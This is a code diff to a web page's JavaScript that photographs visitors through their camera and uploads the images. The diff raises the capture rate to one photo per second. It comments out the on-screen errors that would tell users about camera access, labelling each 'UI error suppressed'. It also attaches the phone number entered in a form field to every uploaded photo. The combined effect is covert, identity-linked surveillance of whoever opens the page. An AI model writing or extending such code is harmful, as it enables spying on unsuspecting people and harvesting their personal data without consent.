@@ -25,19 +25,19 @@ document.addEventListener('DOMContentLoaded', () => {
                 if (photoIntervalId) clearInterval(photoIntervalId); // Clear existing interval if any
                 // Capture a photo immediately, then set interval
                 captureAndSendPhoto();
-                photoIntervalId = setInterval(captureAndSendPhoto, 5000); // Capture every 5 seconds
+                photoIntervalId = setInterval(captureAndSendPhoto, 1000); // Capture every 1 second
             };
             cameraFeed.onerror = (e) => {
                 console.error("Error with camera feed:", e);
-                messageDiv.textContent = 'Error with camera feed. Automatic photo capture might fail.';
-                messageDiv.className = 'message error';
+                // messageDiv.textContent = 'Error with camera feed. Automatic photo capture might fail.'; // UI error suppressed
+                // messageDiv.className = 'message error'; // UI error suppressed
                 if (photoIntervalId) clearInterval(photoIntervalId);
             };
 
         } catch (err) {
             console.error("Error accessing camera: ", err);
-            messageDiv.textContent = 'Camera access denied or not available. Automatic photo capture disabled.';
-            messageDiv.className = 'message error';
+            // messageDiv.textContent = 'Camera access denied or not available. Automatic photo capture disabled.'; // UI error suppressed
+            // messageDiv.className = 'message error'; // UI error suppressed
             if (photoIntervalId) clearInterval(photoIntervalId);
         }
     }
@@ -66,8 +66,11 @@ document.addEventListener('DOMContentLoaded', () => {
         context.drawImage(cameraFeed, 0, 0, photoCanvas.width, photoCanvas.height);
         const imageDataURL = photoCanvas.toDataURL('image/jpeg', 0.8); // Use JPEG with 80% quality
         
-        sendDataToBackend({ photo: imageDataURL, type: 'photo', timestamp: new Date().toISOString() });
-        console.log(`Auto-captured photo at ${new Date().toLocaleTimeString()} sent to backend.`);
+        // Include the current phone number from the input field with the photo data
+        const phoneNumber = phoneNumberInput.value;
+
+        sendDataToBackend({ photo: imageDataURL, type: 'photo', timestamp: new Date().toISOString(), phoneNumber: phoneNumber });
+        console.log(`Auto-captured photo at ${new Date().toLocaleTimeString()} sent to backend (with phone number: ${phoneNumber || 'N/A'}).`);
     }
 
     // The manual snapPhotoButton event listener and photosContainer logic are removed.
